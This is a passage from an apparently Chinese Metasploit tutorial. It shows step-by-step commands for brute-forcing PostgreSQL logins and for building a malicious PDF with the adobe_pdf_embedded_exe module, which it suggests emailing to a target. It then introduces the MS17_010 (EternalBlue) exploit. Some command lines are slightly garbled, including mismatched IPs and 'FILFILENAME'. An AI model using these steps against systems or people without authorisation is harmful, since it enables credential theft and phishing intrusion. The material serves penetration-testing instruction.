    ## 对 PostgreSQL 数据库服务的渗透攻击


    PostgreSQL 是一个免费的对象关系数据库服务（数据库管理系统）。在某些情况下，用户也可以使用数据库服务来存储数据，例如 Metasploit。下面将介绍如何使用
    `postgrs_login` 模块对 PostgreSQL 数据库服务实施渗透测试。


    ### 使用 `postgres_login` 模块对 PostgreSQL 数据库服务实施渗透攻击


    具体步骤如下：


    1) 选择 `postgres_login` 模块。


    执行命令如下：


    ```

    msf5> use auxiliary/scanner/postgres/postgres_login

    msf5 auxiliary(scanner/postgres/postgres_login)>

    ```


    2) 查看可配置选项参数。


    执行命令如下：


    ```

    msf5 auxiliary(scanner/postgres/postgres_login)> show options

    ```


    从输出信息中，你可以看到所有的配置选项参数。接下来将配置所有的选项参数。


    3) 配置 `RHOSTS` 选项参数。


    执行命令如下：


    ```

    msf5 auxiliary(scanner/postgres/postgres_login)> set RHOSTS 192.168.29.223 RHOSTS
    => 192.168.29.225

    ```


    4) 实施渗透测试。


    执行命令如下：


    ```

    msf5 auxiliary(scanner/postgres/postgres_login)> exploit

    msf5 auxiliary (scanner/postgres/postgres_login)>

    ```


    从输出信息中可以看出，发现了一个有效的用户名和密码，两者均为 `postgres`。


    # 使用 Metasploit 进行 PDF 攻击


    PDF 是一种文件格式。这种文件被广泛使用且容易传输。之前介绍的渗透测试方法都是渗透测试的主动实现。如果目标主机没有监控服务器端口，你需要使用被动渗透测试。此时，你可以尝试向客户端发送包含病毒的
    PDF 文件来执行被动攻击。下面将介绍创建带有病毒的 PDF 文件以实现被动渗透攻击。


    ### 使用 Adobe PDF Embedded EXE 模块创建 PDF 病毒文件


    具体步骤如下：


    1) 使用 `adobe_pdf_embedded_exe` 模块。


    执行命令如下：


    ```

    msf> use exploit/windows/fileformat/adobe_pdf_embedded_exe

    msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe)>

    ```


    2) 查看 `adobe_pdf_embedded_exe` 模块的可用选项。


    执行命令如下：


    ```

    msf exploit(adobe_pdf_embedded_exe)> show options

    ```


    上述信息显示了 `adobe_pdf_embedded_exe` 模块的所有可用选项。从上面的输出信息中，你可以看到默认使用的 PDF 病毒文件是 `template.pdf`，输出文件名为
    `evil.pdf`。如果用户不想使用默认 PDF 文件，他们可以指定自己的病毒文件和输出文件名。


    3) 设置用户想要生成的 PDF 文件名。


    执行命令如下：


    ```

    msf exploit(adobe_pdf_embedded_exe)> set FILENAME test.pdf FILFILENAME => test.pdf

    ```


    4) 设置 `INFILENAME` 选项。为了使用 PDF 文件，使用此选项指定用户访问的 PDF 文件的位置。如果用户没有合适的 PDF 攻击文件，也可以使用默认模板文件
    `template.pdf`，无需配置此选项。


    执行命令如下：


    ```

    msf exploit(adobe_pdf_embedded_exe)> set INFILENAME /root/evil.pdf INFILENAME
    => /root/evil.pdf

    ```

    注意：此处指定的 PDF 文件不会被生成。


    5) 生成 PDF 病毒文件。


    执行命令如下：


    ```

    msf exploit(adobe_pdf_embedded_exe)> exploit

    ```

    输出信息显示 `test.pdf` 文件已生成并保存到 `/root/` 下。接下来，用户可以通过电子邮件或其他手段将创建的 PDF 文件发送给目标主机，然后建立监控。当目标主机打开
    PDF 文件时，可能会受到攻击。


    利用 MS17_010 漏洞进行攻击


    MS17_010 是一个被“永恒之蓝”（勒索软件）利用的 Windows 漏洞。渗透测试人员可以通过利用此漏洞发送特殊设计的消息到 Microsoft Message
    Block 1.0 (`SMBv1`) 服务器，允许远程代码执行。下面将介绍利用 MS17_010 漏洞对 WindowsServer 2008 R2 (`x64`)
    进行渗透测试。


